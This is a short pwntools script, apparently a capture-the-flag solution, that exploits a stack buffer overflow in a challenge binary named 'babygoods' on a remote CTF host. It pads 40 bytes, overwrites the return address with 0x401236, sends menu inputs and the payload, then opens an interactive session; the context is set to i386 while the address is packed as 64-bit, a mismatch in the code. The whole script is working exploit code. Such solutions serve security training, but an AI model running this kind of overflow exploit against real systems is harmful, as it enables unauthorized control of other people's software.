from pwn import *
import struct
import pwn

context(arch='i386', os='linux')

# p = process('./babygoods')
p = remote('challs.nusgreyhats.org',32345)

offset = 40
buff = pwn.p64(0x0000000000401236)


payload = b'A'* offset + buff
print(payload)

p.sendline('AAA')
p.sendline('1')
p.sendline('2')
p.sendline(payload)
p.interactive()
# s = p.recvall()
# print(s)
